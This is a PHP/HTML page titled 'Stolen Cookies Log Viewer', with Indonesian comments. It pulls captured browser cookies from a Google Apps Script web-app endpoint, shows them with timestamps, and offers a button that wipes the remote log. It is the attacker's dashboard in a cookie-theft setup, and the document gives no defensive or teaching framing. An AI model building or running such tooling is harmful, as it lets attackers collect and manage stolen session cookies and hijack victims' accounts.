<!DOCTYPE html>
<html>

<head>
    <title>Stolen Cookies Log Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 2em;
        }

        .container {
            max-width: 800px;
            margin: auto;
        }

        pre {
            background: #f4f4f4;
            padding: 1em;
            border: 1px solid #ddd;
            white-space: pre-wrap;
        }

        .log-entry {
            margin-bottom: 1em;
            padding: 1em;
            border-bottom: 1px solid #ccc;
        }

        .delete-form {
            margin-top: 1em;
        }

        .btn {
            padding: 10px 15px;
            background-color: #dc3545;
            color: white;
            border: none;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #c82333;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Stolen Cookies Log</h1>

        <?php
        // Ganti dengan URL Web App Google Apps Script Anda
        $sheetApiUrl = 'https://script.google.com/macros/s/AKfycbzQrtVwuR69C7QmuBaVCgzScijvxQdVyWjDqYxKl-ctE84XzGV3idjvnq6Y0wW58cw/exec';
        $deleteAction = false;

        // Handle delete request (clear Google Sheet)
        if (isset($_POST['delete'])) {
            $clearUrl = $sheetApiUrl . '?action=clear';
            $result = @file_get_contents($clearUrl);
            $deleteAction = true;
            if ($result === false) {
                echo '<p style="color: red;">Failed to clear log data on Google Sheets.</p>';
            } else {
                echo '<p style="color: green;">Log data on Google Sheets has been cleared.</p>';
            }
        }
        ?>

        <h2>Log Entries:</h2>
        <?php
        // Ambil data log dari Google Sheets
        $logData = @file_get_contents($sheetApiUrl);
        if ($logData !== false && !$deleteAction) {
            $logArray = json_decode($logData, true);
            if (is_array($logArray) && count($logArray) > 0) {
                echo '<pre>';
                foreach ($logArray as $row) {
                    // Format: [timestamp] Cookie: value
                    if (count($row) >= 2) {
                        echo '[' . htmlspecialchars($row[0]) . '] Cookie: ' . htmlspecialchars($row[1]) . "\n";
                    }
                }
                echo '</pre>';
            } else {
                echo '<p>No cookies have been logged yet.</p>';
            }
        } elseif (!$deleteAction) {
            echo '<p>No cookies have been logged yet.</p>';
        }
        
        ?>

        <form method="post" class="delete-form">
            <button type="submit" name="delete" class="btn" onclick="return confirm('Are you sure you want to delete the log file? This action is irreversible.');">
                Delete Log File
            </button>
        </form>
    </div>
</body>

</html>